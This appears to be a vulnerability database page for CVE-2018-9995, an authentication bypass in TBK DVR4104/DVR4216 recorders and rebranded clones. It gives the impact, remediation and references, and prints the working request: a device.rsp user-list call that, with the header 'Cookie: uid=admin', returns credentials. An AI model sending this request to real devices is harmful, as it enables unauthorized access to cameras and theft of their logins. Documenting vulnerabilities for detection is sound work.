---
layout: post
cve_id: CVE-2018-9995
title: TBK DVR4104/DVR4216 Devices - Authentication Bypass
pcap: true
pcap_path: /pcaps/2018/CVE-2018-9995.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2018/CVE-2018-9995.yaml
snort2_rule: N/A
snort3_rule: N/A
author: princechaddha
severity: critical
impact: 'An attacker can bypass authentication and gain unauthorized access to the
  device, potentially leading to unauthorized configuration changes or data exfiltration.

  '
remediation: 'Apply the latest firmware update provided by the vendor to fix the authentication
  bypass vulnerability and ensure strong and unique passwords are used for device
  access.

  '
reference:
- https://www.exploit-db.com/exploits/44577/
- http://misteralfa-hack.blogspot.cl/2018/04/tbk-vision-dvr-login-bypass.html
- http://misteralfa-hack.blogspot.cl/2018/04/update-dvr-login-bypass-cve-2018-9995.html
- https://www.bleepingcomputer.com/news/security/new-hacking-tool-lets-users-access-a-bunch-of-dvrs-and-their-video-feeds/
- https://nvd.nist.gov/vuln/detail/CVE-2018-9995
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2018-9995
  epss-score: 0.94122
  epss-percentile: 0.99905
  cpe: cpe:2.3:o:tbkvision:tbk-dvr4216_firmware:-:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: tbkvision
  product: tbk-dvr4216_firmware
tags:
- cve
- cve2018
- auth-bypass
- tbk
- edb
- tbkvision
- vkev
- vuln
---

## üîç Vulnerability Description
TBK DVR4104 and DVR4216 devices, as well as Novo, CeNova, QSee, Pulnix, XVR 5 in 1, Securus, Night OWL, DVR Login, HVR Login, and
MDVR Login, which run re-branded versions of the original TBK DVR4104 and DVR4216 series, allow remote attackers to bypass
authentication via a "Cookie: uid=admin" header, as demonstrated by a device.rsp?opt=user&cmd=list request that provides credentials within JSON data in a response.


## üåê HTTP Request
```nohighlight
GET /device.rsp?opt=user&cmd=list HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.7.20) Gecko/ Firefox/3.6.10
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

